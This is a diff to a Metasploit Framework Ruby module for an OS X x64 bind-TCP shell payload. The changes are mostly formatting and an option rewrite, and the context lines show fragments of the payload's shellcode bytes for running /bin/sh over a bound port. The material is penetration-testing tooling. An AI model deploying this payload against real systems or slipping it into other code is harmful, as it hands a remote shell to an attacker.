@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -15,27 +11,26 @@ require 'msf/core'
 module Metasploit3
 
 	include Msf::Payload::Single
-        include Msf::Payload::Osx
-        include Msf::Sessions::CommandShellOptions
+	include Msf::Payload::Osx
+	include Msf::Sessions::CommandShellOptions
 
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'          => 'OS X x64 Shell Bind TCP',
-			'Version'       => '$Revision$',
 			'Description'   => 'Bind an arbitrary command to an arbitrary port',
 			'Author'        => 'nemo <nemo[at]felinemenace.org>',
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'osx',
 			'Arch'          => ARCH_X86_64,
-			'Handler'      => Msf::Handler::BindTcp,
-                        'Session'       => Msf::Sessions::CommandShellUnix
+			'Handler'       => Msf::Handler::BindTcp,
+			'Session'       => Msf::Sessions::CommandShellUnix
 		))
 
 		# exec payload options
 		register_options(
 			[
 				OptString.new('CMD',  [ true,  "The command string to execute", "/bin/sh" ]),
-				OptString.new('LPORT',[ true,  "The port to bind to", "5555" ]),
+				Opt::LPORT(4444)
 		], self.class)
 	end
 
@@ -84,7 +79,7 @@ module Metasploit3
 			"\xB8\x3B\x00\x00\x02" +     # mov eax,0x200003b
 			call +                       # call CMD.len
 			cmd +                        # CMD
-                        "\x48\x8b\x3c\x24" +         # mov rdi, [rsp]
+			"\x48\x8b\x3c\x24" +         # mov rdi, [rsp]
 			"\x48\x31\xD2" +             # xor rdx,rdx
 			"\x52" +                     # push rdx
 			"\x57" +                     # push rdi
